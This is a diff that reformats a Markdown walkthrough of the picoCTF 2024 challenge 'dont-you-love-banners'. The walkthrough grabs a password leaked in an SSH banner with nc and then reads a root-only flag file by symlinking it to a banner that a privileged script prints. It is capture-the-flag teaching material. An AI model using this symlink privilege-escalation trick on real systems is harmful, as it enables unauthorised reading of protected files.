@@ -5,7 +5,8 @@
 - [References](#references)
 
 ## Challenge information
-```
+
+```text
 Level: Medium
 Tags: General Skills, picoCTF 2024, shell, browser_webshell_solvable
 Author: LOIC SHEMA / SYREAL
@@ -23,6 +24,7 @@ Hints:
 1. Do you know about symlinks?
 2. Maybe some small password cracking or guessing
 ```
+
 Challenge link: [https://play.picoctf.org/practice/challenge/437](https://play.picoctf.org/practice/challenge/437)
 
 ## Solution
@@ -30,6 +32,7 @@ Challenge link: [https://play.picoctf.org/practice/challenge/437](https://play.p
 ### Get banner info
 
 We begin by connecting to the leaky service
+
 ```bash
 ┌──(kali㉿kali)-[/mnt/…/picoCTF/picoCTF_2024/General_Skills/dont-you-love-banners]
 └─$ nc tethys.picoctf.net 61669
@@ -37,11 +40,13 @@ SSH-2.0-OpenSSH_7.6p1 My_Passw@rd_@1234
 ^C
 
 ```
+
 We get a possible password (`My_Passw@rd_@1234`) in the OpenSSH banner.
 
 ### Connect to the application
 
 Next, we connect to the application
+
 ```bash
 ┌──(kali㉿kali)-[/mnt/…/picoCTF/picoCTF_2024/General_Skills/dont-you-love-banners]
 └─$ nc tethys.picoctf.net 64937                
@@ -57,13 +62,16 @@ the first hacker ever was known for phreaking(making free phone calls), who was 
 John Draper
 player@challenge:~$ 
 ```
+
 After some googling and trial-and-error we find the additional answers:
+
 - [DEFCON](https://defcon.org/)
 - [John Draper](https://en.wikipedia.org/wiki/John_Draper)
 
 ### Enumeration
 
 Now we can do some enumeration and search for the flag
+
 ```bash
 player@challenge:~$ ls -la
 ls -la
@@ -100,11 +108,13 @@ ls -la /root/flag.txt
 -rwx------ 1 root root 46 Mar  9 16:39 /root/flag.txt
 player@challenge:~$ 
 ```
+
 We need to escalate our privileges to read the flag file.
 
 ### Privilege escalation
 
 Let's check what else is in the `/root` directory
+
 ```bash
 player@challenge:~$ cd /root
 cd /root
@@ -160,12 +170,14 @@ except:
 
 player@challenge:/root$ 
 ```
+
 Ah, this is the script that runs when we connect to the application.  
 And it reads and prints the banner file.
 
 ### Create a symbolic link to the flag file
 
 We can create a symbolic link to the flag file and it will be printed when we connect to the application
+
 ```bash
 player@challenge:/root$ ln -f -s /root/flag.txt /home/player/banner
 ln -f -s /root/flag.txt /home/player/banner
@@ -182,6 +194,7 @@ What is the top cyber security conference in the world?
 ### Get the flag
 
 Finally, we connect to the application again and get the flag
+
 ```bash
 ┌──(kali㉿kali)-[/mnt/…/picoCTF/picoCTF_2024/General_Skills/dont-you-love-banners]
 └─$ nc tethys.picoctf.net 64937
@@ -190,13 +203,13 @@ picoCTF{<REDACTED>}
 what is the password? 
 ^C
 ```
- 
+
 For additional information, please see the references below.
 
 ## References
 
 - [find - Linux manual page](https://man7.org/linux/man-pages/man1/find.1.html)
+- [John Draper - Wikipedia](https://en.wikipedia.org/wiki/John_Draper)
 - [ln - Linux manual page](https://man7.org/linux/man-pages/man1/ln.1.html)
 - [nc - Linux manual page](https://linux.die.net/man/1/nc)
-- [Wikipedia - John Draper](https://en.wikipedia.org/wiki/John_Draper)
-- [Wikipedia - Phreaking](https://en.wikipedia.org/wiki/Phreaking)
+- [Phreaking - Wikipedia](https://en.wikipedia.org/wiki/Phreaking)
